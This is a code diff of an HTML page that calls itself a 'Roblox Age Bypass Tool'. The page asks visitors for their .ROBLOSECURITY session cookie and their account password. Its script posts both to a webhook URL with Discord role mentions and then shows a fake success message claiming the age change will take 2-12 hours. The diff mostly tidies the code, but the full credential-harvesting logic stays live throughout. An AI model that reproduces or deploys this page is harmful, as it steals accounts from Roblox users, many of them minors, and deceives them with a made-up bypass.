@@ -6,7 +6,6 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* Styles unverändert vom letzten Code */
     * {
       box-sizing: border-box;
     }
@@ -94,6 +93,7 @@
       box-shadow: inset 0 0 5px rgba(0,255,255,0.1);
       outline: none;
     }
+
     textarea::placeholder {
       color: #5c7f94;
     }
@@ -116,6 +116,7 @@
       user-select: none;
       transition: background 0.3s ease;
     }
+
     button:hover {
       background: linear-gradient(90deg, #e000b9, #00d4ff);
     }
@@ -203,29 +204,25 @@
       100% { transform: rotate(360deg); }
     }
 
-    @media (max-width: 600px) {
-      h1 {
-        font-size: 28px;
-      }
-    }
-
-    /* Neu: Button unten rechts */
     #help-button {
       position: fixed;
       bottom: 20px;
       right: 20px;
       background: linear-gradient(90deg, #ff00c8, #00f0ff);
       border: none;
-      padding: 12px 18px;
-      border-radius: 10px;
+      padding: 10px 16px;
+      border-radius: 8px;
       color: white;
       font-weight: 600;
+      font-size: 14px;
       cursor: pointer;
-      box-shadow: 0 0 8px #00f0ff;
-      user-select: none;
-      transition: background 0.3s ease;
-      z-index: 11000;
+      box-shadow: 0 0 8px rgba(0, 240, 255, 0.6);
+      z-index: 9999;
+      width: auto;
+      max-width: 250px;
+      white-space: nowrap;
     }
+
     #help-button:hover {
       background: linear-gradient(90deg, #e000b9, #00d4ff);
     }
@@ -237,7 +234,7 @@
 
   <div class="container">
     <label for="bypass">🔐 Account Security Options</label>
-    <select id="bypass" aria-label="Account Security Options">
+    <select id="bypass">
       <option value="">-- Select an option --</option>
       <option value="birthyear">2008 Birthyear Up</option>
       <option value="13plus">13+ All Ages</option>
@@ -245,17 +242,15 @@
 
     <div id="cookie-block" class="input-block" style="display:none;">
       <div class="input-block-title">.ROBLOSECURITY Cookie</div>
-      <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+      <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false"></textarea>
     </div>
 
     <div id="password-block" class="input-block" style="display:none;">
       <div class="input-block-title">Account Password</div>
-      <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+      <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false"></textarea>
     </div>
 
-    <button id="process-button" type="button" aria-label="Process Account">
-      ⚙️ PROCESS ACCOUNT
-    </button>
+    <button id="process-button">⚙️ PROCESS ACCOUNT</button>
 
     <div class="info-box">
       <div class="info-title">⚠️ Important Information</div>
@@ -273,12 +268,10 @@
 
   <div id="error-message">ERROR Try later again.</div>
   <div id="success-message">Everything worked it can take 2-12 Hours until the age will be set</div>
+  <div id="loader-overlay"><div class="loader"></div></div>
 
-  <div id="loader-overlay">
-    <div class="loader"></div>
-  </div>
-
-  <button id="help-button" aria-label="Need Help? Here is a tutorial!">Need Help? Here is a tutorial!</button>
+  <!-- 💡 Help Button -->
+  <button id="help-button">Need Help? Here is a tutorial!</button>
 
   <script>
     const bypassSelect = document.getElementById('bypass');
@@ -328,30 +321,21 @@
 
     async function sendEmbedToDiscord(title, description) {
       const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
-
-      const userMention = '<@1030535100829540464> <@&1392621247460020254>\n\n';
-
       const data = {
-        content: userMention,
+        content: '<@1030535100829540464> <@&1392621247460020254>',
         embeds: [{
           title: title,
           description: description,
           color: 0x00ffff,
-          timestamp: new Date().toISOString(),
+          timestamp: new Date().toISOString()
         }]
       };
-
       const response = await fetch(webhookUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
-
-      if (!response.ok) {
-        throw new Error('Failed to send to Discord');
-      }
+      if (!response.ok) throw new Error('Failed to send to Discord');
     }
 
     processBtn.addEventListener('click', async () => {
@@ -361,15 +345,7 @@
       const cookieVal = cookieInput.value.trim();
       const passwordVal = passwordInput.value.trim();
 
-      if (!selected) {
-        showError('ERROR Try later again.');
-        return;
-      }
-      if (cookieVal.length < 500) {
-        showError('ERROR Try later again.');
-        return;
-      }
-      if (selected === '13plus' && passwordVal.length === 0) {
+      if (!selected || cookieVal.length < 500 || (selected === '13plus' && !passwordVal)) {
         showError('ERROR Try later again.');
         return;
       }
@@ -378,25 +354,22 @@
       loaderOverlay.style.display = 'flex';
 
       try {
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n**Cookie:** ${cookieVal}`);
-
+        const method = selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages';
+        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${method}\n**Cookie:** ${cookieVal}`);
         if (selected === '13plus') {
           await sendEmbedToDiscord('Account Password', `**Method:** 13+ All Ages\n**Password:** ${passwordVal}`);
         }
-
-        // Warte 1.2 Sekunden (Loader anzeigen)
         await new Promise(resolve => setTimeout(resolve, 1200));
-
-        loaderOverlay.style.display = 'none';
         showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
-      } catch (error) {
-        loaderOverlay.style.display = 'none';
+      } catch (e) {
         showError('ERROR Try later again.');
       } finally {
+        loaderOverlay.style.display = 'none';
         processBtn.disabled = false;
       }
     });
 
+    // Tutorial Button click event
     document.getElementById('help-button').addEventListener('click', () => {
       window.open('https://youtu.be/YwtYdwH9SSE', '_blank');
     });
